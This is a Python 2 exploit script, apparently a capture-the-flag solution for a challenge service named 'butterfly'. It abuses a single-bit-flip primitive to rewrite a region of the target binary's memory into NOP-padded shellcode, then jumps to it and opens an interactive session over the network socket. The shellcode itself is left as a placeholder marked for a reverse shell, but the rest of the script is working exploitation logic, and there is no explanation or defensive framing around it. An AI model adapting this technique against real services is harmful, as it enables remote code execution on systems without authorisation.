import socket
import struct
import telnetlib

# Stuff located at 0x000000000040096C
stuff = '''
01 1B 03 3B 30 00 00 00  05 00 00 00 84 FC FF FF
7C 00 00 00 24 FD FF FF  4C 00 00 00 1C FE FF FF
BC 00 00 00 24 FF FF FF  E4 00 00 00 94 FF FF FF
2C 01 00 00 14 00 00 00  00 00 00 00 01 7A 52 00
01 78 10 01 1B 0C 07 08  90 01 07 10 14 00 00 00
1C 00 00 00 D0 FC FF FF  2A 00 00 00 00 00 00 00
00 00 00 00 14 00 00 00  00 00 00 00 01 7A 52 00
01 78 10 01 1B 0C 07 08  90 01 00 00 24 00 00 00
1C 00 00 00 00 FC FF FF  90 00 00 00 00 0E 10 46
0E 18 4A 0F 0B 77 08 80  00 3F 1A 3B 2A 33 24 22
00 00 00 00 14 00 00 00  00 00 00 00 03 7A 52 00
01 78 10 01 1B 0C 07 08  90 01 00 00 24 00 00 00
1C 00 00 00 58 FD FF FF  00 01 00 00 00 41 0E 10
42 0E 18 42 0E 20 41 0E  28 44 0E 70 83 05 8E 04
8F 03 86 02 44 00 00 00  84 00 00 00 38 FE FF FF
65 00 00 00 00 42 0E 10  8F 02 42 0E 18 8E 03 45
0E 20 8D 04 42 0E 28 8C  05 48 0E 30 86 06 48 0E
38 83 07 4F 0E 40 70 0E  38 41 0E 30 41 0E 28 42
0E 20 42 0E 18 42 0E 10  42 0E 08 00 14 00 00 00
CC 00 00 00 60 FE FF FF  02 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 60 07 40 00
'''
stuff = stuff.replace(' ','').replace('\n','').decode('hex')

# Payload
shellcode =  "\x90"*50
shellcode += ( 
    # reverse shell
    XXX
)
shellcode += '\xCC'*20

assert len(shellcode) <= len(stuff)


def get_addr(offset):
    return (4194304+offset)<<3

def get_offsets(f, t):
    if f == t:
        return [0]
    need = ord(f)^ord(t)
    offsets = []
    for i in range(8):
        lsb = (need>>i) % 2
        if lsb == 1:
            offsets.append(i)
        i += 1
    return offsets

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

exp = []
func = struct.pack('Q', 0x0000000000400788)

# FIRST LOAD
addr = get_addr(0x862) # 33571600
buff = ('A'*(32-len(str(addr))))
exp += [str(addr)+buff+func]

# GENERATE SHELLCODE
i = 0x96C
mystuff = struct.pack('Q', 0x0000000000400000+i)
for f,t in zip(stuff,shellcode):
    offs =  get_offsets(f,t)
    for o in offs:
        addr = get_addr(i) + o
        buff = ('A'*(32-len(str(addr))))
        e = str(addr)+buff+func
        exp.append(e)
    i += 1

# JUMP TO SHELLCODE
exp += [str(addr)+buff+mystuff]


out = ''
for line in exp:
    out += line + 'B'*(50-len(line)-1)

s = socket.create_connection(("butterfly.pwning.xxx",9999))
s.send(out)    
interact(s)
